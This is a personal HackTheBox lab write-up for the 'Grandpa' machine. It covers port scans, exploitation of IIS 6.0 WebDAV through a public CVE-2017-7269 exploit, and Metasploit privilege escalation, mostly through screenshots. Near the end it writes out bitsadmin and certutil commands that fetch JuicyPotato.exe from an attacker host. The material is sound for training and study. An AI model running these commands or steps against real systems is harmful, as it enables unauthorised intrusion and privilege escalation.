---
tags:
  - iis
---
***Overview**: Grandpa is an Easy rated HTB machine that exploits a vulnerable IIS version to gain compromised access.*
# HTB: Grandpa

## Scanning and Reconnaissance
- so we start by scanning for open ports and services and we identify that an IIS server is running on port 80

```shell
┌──(kali㉿kali)-[~/HTB/Grandpa]
└─$ sudo masscan -p1-65535 10.10.10.14 --rate=1000 -e tun0 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-16 23:18:25 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Grandpa]
└─$ cat ports
Discovered open port 80/tcp on 10.10.10.14                                     
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Grandpa]
└─$ nmap -sV -sC -p80 10.10.10.14 -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 18:22 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:22
Completed Parallel DNS resolution of 1 host. at 18:22, 0.08s elapsed
Initiating Connect Scan at 18:22
Scanning 10.10.10.14 [1 port]
Discovered open port 80/tcp on 10.10.10.14
Completed Connect Scan at 18:22, 0.20s elapsed (1 total ports)
Initiating Service scan at 18:22
Scanning 1 service on 10.10.10.14
Completed Service scan at 18:22, 6.41s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.14.
Initiating NSE at 18:22
Completed NSE at 18:22, 9.04s elapsed
Initiating NSE at 18:22
Completed NSE at 18:22, 2.83s elapsed
Initiating NSE at 18:22
Completed NSE at 18:22, 0.00s elapsed
Nmap scan report for 10.10.10.14
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Thu, 16 Nov 2023 23:22:17 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Port 80
- Navigating to the web page, we are presented with the below, we can inspect it too but there's nothing

![](assets/Grandpa_assets/Pasted%20image%2020231117001745.png)

- In wappalyzer, we can confirm that its a windows server and it is IIS 6.0 as we saw

![](assets/Grandpa_assets/Pasted%20image%2020231117002130.png)

## Explotation and Foothold
- so searching for exploits for IIS 6.0, we come across one at [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
- so utilizing it we get compromised access

![](assets/Grandpa_assets/Pasted%20image%2020231117010609.png)

- we can check for who we are and also our privileges (we can see SeImpersonate meaning a possibility of a Potato attack)

![](assets/Grandpa_assets/Pasted%20image%2020231117010510.png)

- we can also utilize metasploit for this and also gain compromised access, but we cannot run commands, meaning we have to migrate our process

![](assets/Grandpa_assets/Pasted%20image%2020231117085206.png)

- so we run `ps` to see the processes we have

![](assets/Grandpa_assets/Pasted%20image%2020231117085224.png)

- we can then migrate to the process and we see that we can run the getuid command now

![](assets/Grandpa_assets/Pasted%20image%2020231117085243.png)

- we can view the user flag

![](assets/Grandpa_assets/Pasted%20image%2020231117085818.png)
## Privilege Escalation
- we can use the exploit suggester in metasploit to check for possible privilege escalation vectors. we can set our session and then run the exploit suggester

![](assets/Grandpa_assets/Pasted%20image%2020231117085718.png)

- so we can select any one of the exploit to escalate privileges, we select the first one one and select our session. so now we have access ad Administrator and can view the root file

![](assets/Grandpa_assets/Pasted%20image%2020231117085902.png)


```
bitsadmin /transfer transfName /priority high http://10.10.14.6/JuicyPotato.exe JuicyPotato.exe

certutil.exe -urlcache -split -f http://10.10.14.6/JuicyPotato.exe
```

use nikto
was using this guide to set up ftp server for [https://www.linode.com/docs/guides/vsftpd-on-ubuntu-2004-installation-and-configuration/](https://www.linode.com/docs/guides/vsftpd-on-ubuntu-2004-installation-and-configuration/) for transfer but it didn't work

using davtest

![](assets/Grandpa_assets/Pasted%20image%2020231117091217.png)